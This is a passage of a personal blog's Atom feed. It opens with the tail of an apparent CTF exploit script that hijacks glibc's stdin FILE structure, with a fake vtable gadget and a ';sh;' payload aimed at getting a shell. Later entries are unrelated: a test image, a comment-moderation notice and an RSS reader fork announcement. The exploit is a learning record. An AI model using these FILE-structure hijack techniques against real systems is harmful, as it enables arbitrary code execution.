class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># lets overwrite the stdin-&gt;_IO_buf_base</span></span><br><span class="line"><span class="comment">#gdb.attach(io, &#x27;pie breakpoint 0x15396\nc\n&#x27;)</span></span><br><span class="line">gdb.attach(io,<span class="string">&quot;b _IO_doallocbuf\n&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(stdin_addr+<span class="number">0x38</span>+<span class="number">2</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># use scanf to send payload</span></span><br><span class="line">ptr_chk_guard_addr = libc_base - <span class="number">0x2890</span> <span class="comment"># this guy lies in the tls. not ld.so</span></span><br><span class="line">gadget = <span class="number">0x406320</span> </span><br><span class="line">system = libc_base + <span class="number">0x508f2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">scanf:</span></span><br><span class="line"><span class="string"> if (fp-&gt;_IO_buf_base == NULL)</span></span><br><span class="line"><span class="string">   &#123;</span></span><br><span class="line"><span class="string">     /* Maybe we already have a push back pointer.  */</span></span><br><span class="line"><span class="string">     if (fp-&gt;_IO_save_base != NULL)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  free (fp-&gt;_IO_save_base);</span></span><br><span class="line"><span class="string">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">     _IO_doallocbuf (fp);</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string"> _IO_doallocbuf:</span></span><br><span class="line"><span class="string">void_IO_doallocbuf (_IO_FILE *fp)&#123;  if (fp-&gt;_IO_buf_base) # How to input buffer is not empty, return directly return; </span></span><br><span class="line"><span class="string">if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; 0) #check flag</span></span><br><span class="line"><span class="string">if (_IO_DOALLOCATE (fp) != EOF) ## call vtable function      return;  _</span></span><br><span class="line"><span class="string">IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+1, 0);&#125;</span></span><br><span class="line"><span class="string">libc_hidden_def (_IO_doallocbuf)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">fake_io = p32(<span class="number">0xfbad208b</span>) + <span class="string">b&#x27;;sh;&#x27;</span></span><br><span class="line"><span class="comment">#fake_io += p64(ptr_chk_guard_addr) + p64(ptr_chk_guard_addr + 8)</span></span><br><span class="line"><span class="comment">#fake_io += p64(ptr_chk_guard_addr + 8)</span></span><br><span class="line"><span class="comment">#fake_io += p64(ptr_chk_guard_addr) * 4</span></span><br><span class="line"><span class="comment">#fake_io += p64(ptr_chk_guard_addr + 8)</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0xa0</span>-<span class="number">8</span>-<span class="number">3</span>)</span><br><span class="line">payload += p64(gadget)  <span class="comment">#vtable</span></span><br><span class="line"><span class="comment">#payload += b&#x27;\x00&#x27; * 0x200</span></span><br><span class="line"><span class="comment">#payload = payload.ljust(0xa70, b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="comment">#payload += b&#x27;c&#x27; * 13 #+ fake_io</span></span><br><span class="line"><span class="comment">#payload = b&#x27;\x00&#x27; * 0x10</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;choice: &#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PWN-IOfile-simple-record-1&quot;&gt;&lt;a href=&quot;#PWN-IOfile-simple-record-1&quot; class=&quot;headerlink&quot; title=&quot;PWN IOfile simple record (1)&quot;&gt;&lt;/a&gt;PWN IO</summary>
      
    
    
    
    <category term="pwn" scheme="https://jsjsj.top/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://jsjsj.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>test_images</title>
    <link href="https://jsjsj.top/2021/10/04/test-images/"/>
    <id>https://jsjsj.top/2021/10/04/test-images/</id>
    <published>2021-10-04T03:02:45.000Z</published>
    <updated>2023-10-04T06:57:16.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/test.jpeg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/test.jpeg&quot;&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>About Comments</title>
    <link href="https://jsjsj.top/2021/07/16/About-Comments/"/>
    <id>https://jsjsj.top/2021/07/16/About-Comments/</id>
    <published>2021-07-15T16:00:00.000Z</published>
    <updated>2023-08-18T06:08:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>I haven’t updated my blog for a long time. Recently, I found some unkind comments here, but they are not allowed. So, I removed them then. I think I have to make some changes.</p><p>From now on, I will check comments more frequently and will deal with the unkind comments I found. If you found any unkind comments, feel free to tell me to remove them.</p><p>Plus, comments area is not for testing, it’s for sharing and exchanging amazing ideas about the post with others. So, test comments will be removed, too.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;I haven’t updated my blog for a long time. Recently, I found some unkind comments here, but they are not allowed. So, I removed them then</summary>
      
    
    
    
    <category term="Announcement" scheme="https://jsjsj.top/categories/Announcement/"/>
    
    
    <category term="misc" scheme="https://jsjsj.top/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>Acrylic Reader is Here</title>
    <link href="https://jsjsj.top/2020/08/30/Acrylic-Reader-is-Here/"/>
    <id>https://jsjsj.top/2020/08/30/Acrylic-Reader-is-Here/</id>
    <published>2020-08-29T16:00:00.000Z</published>
    <updated>2023-08-18T06:08:06.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/MrWillCom/acrylic-reader">Acrylic Reader</a> project is launched.</p><span id="more"></span><p>After my 2 recent pull requests to <a href="https://hyliu.me/fluent-reader/">Fluent Reader</a>, I gave up to merge new features to <a href="https://hyliu.me/fluent-reader/">Fluent Reader</a> because <a href="https://github.com/yang991178">yang991178</a> closed both my 2 pull requests. To know more about this, read <a href="/2020/08/29/Closed-Closed-Again/">my recent post</a>.</p><div class="container">    <div style="margin: 32px 0; text-align: center">        <span title="Status: Closed" style="display:inline-block;padding:5px 12px;font-size:14px;font-weight:500;line-height:20px;color:#fff;text-align:center;white-space:nowrap;background-color:#6a737d;border:1px solid transparent;border-radius:2em; background-color: #28a745;">            <svg height="16" style="display:inline-block;fill:currentColor;vertical-align:text-bottom" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true"><path fill-rule="evenodd" d="M14.064 0a8.75 8.75 0 00-6.187 2.563l-.459.458c-.314.314-.616.641-.904.979H3.31a1.75 1.75 0 00-1.49.833L.11 7.607a.75.75 0 00.418 1.11l3.102.954c.037.051.079.1.124.145l2.429 2.428c.046.046.094.088.145.125l.954 3.102a.75.75 0 001.11.418l2.774-1.707a1.75 1.75 0 00.833-1.49V9.485c.338-.288.665-.59.979-.904l.458-.459A8.75 8.75 0 0016 1.936V1.75A1.75 1.75 0 0014.25 0h-.186zM10.5 10.625c-.088.06-.177.118-.266.175l-2.35 1.521.548 1.783 1.949-1.2a.25.25 0 00.119-.213v-2.066zM3.678 8.116L5.2 5.766c.058-.09.117-.178.176-.266H3.309a.25.25 0 00-.213.119l-1.2 1.95 1.782.547zm5.26-4.493A7.25 7.25 0 0114.063 1.5h.186a.25.25 0 01.25.25v.186a7.25 7.25 0 01-2.123 5.127l-.459.458a15.21 15.21 0 01-2.499 2.02l-2.317 1.5-2.143-2.143 1.5-2.317a15.25 15.25 0 012.02-2.5l.458-.458h.002zM12 5a1 1 0 11-2 0 1 1 0 012 0zm-8.44 9.56a1.5 1.5 0 10-2.12-2.12c-.734.73-1.047 2.332-1.15 3.003a.23.23 0 00.265.265c.671-.103 2.273-.416 3.005-1.148z"></path></svg> Launched        </span>    </div></div><p>Acrylic Reader is fully based on <a href="https://hyliu.me/fluent-reader/">Fluent Reader</a> and will keep up to date with it. Also I will add and improve some features of it.</p><p><img src="/img/000012.png" alt="The logo of Acrylic Reader"></p><p>Go to <a href="https://github.com/MrWillCom/acrylic-reader">Acrylic Reader’s GitHub home page</a> to know more about this project.</p><p>Till now, Acrylic Reader has 2 more features than Fluent Reader and 1 feature merged into Fluent Reader. But why didn’t I merge them into Fluent Reader?</p><h2 id="Why-didn’t-I-merge-them-into-Fluent-Reader"><a href="#Why-didn’t-I-merge-them-into-Fluent-Reader" class="headerlink" title="Why didn’t I merge them into Fluent Reader"></a>Why didn’t I merge them into Fluent Reader</h2><p>I have tried twice to merge my new features to Fluent Reader, but failed twice. <a href="https://github.com/yang991178">yang991178</a> didn’t review my pull requests and closed them. To know what pull requests they are, go to <a href="https://github.com/yang991178/fluent-reader/pull/86">yang991178&#x2F;fluent-reader #86</a> and <a href="https://github.com/yang991178/fluent-reader/pull/88">#88</a>.</p><div class="container">    <div style="margin: 32px 0; text-align: center">        <span title="Status: Closed" style="display:inline-block;padding:5px 12px;font-size:14px;font-weight:500;line-height:20px;color:#fff;text-align:center;white-space:nowrap;background-color:#6a737d;border:1px solid transparent;border-radius:2em; background-color: #d73a49;">            <svg height="16" style="display:inline-block;fill:currentColor;vertical-align:text-bottom" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.177 3.073L9.573.677A.25.25 0 0110 .854v4.792a.25.25 0 01-.427.177L7.177 3.427a.25.25 0 010-.354zM3.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122v5.256a2.251 2.251 0 11-1.5 0V5.372A2.25 2.25 0 011.5 3.25zM11 2.5h-1V4h1a1 1 0 011 1v5.628a2.251 2.251 0 101.5 0V5A2.5 2.5 0 0011 2.5zm1 10.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0zM3.75 12a.75.75 0 100 1.5.75.75 0 000-1.5z"></path></svg> Closed        </span>    </div></div><p><a href="https://github.com/yang991178">yang991178</a> said that he thought my pull requests’s animation update is not necessary. But his animation is really rigid that cuts the shadow when playing. And said that my animation will squeeze the contents. But my animation doesn’t.</p><p>I am really disappointed, but I want to keep my new features. So Acrylic Reader launched.</p><p>Acrylic Reader will give you a better experience and more useful features.</p><p>I’m glad to merge all of my new features to Fluent Reader if <a href="https://github.com/yang991178">yang991178</a> want to in the future.</p><p>To know what new features in Acrylic Reader are, visit <a href="https://mrwillcom.github.io/acrylic-reader/">the home page of Acrylic Reader</a>.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/MrWillCom/acrylic-reader&quot;&gt;Acrylic Reader&lt;/a&gt; project is launched.&lt;/p&gt;</summary>
    
    
    
    <category term="Announcement" scheme="https://jsjsj.top/categories/Announcement/"/>
    
    
    <category term="reader" scheme="https://jsjsj.top/tags/reader/"/>
    
    <category term="rss" scheme="https://jsjsj.top/tags/rss/"/>
    
  </entry>
  
</feed>
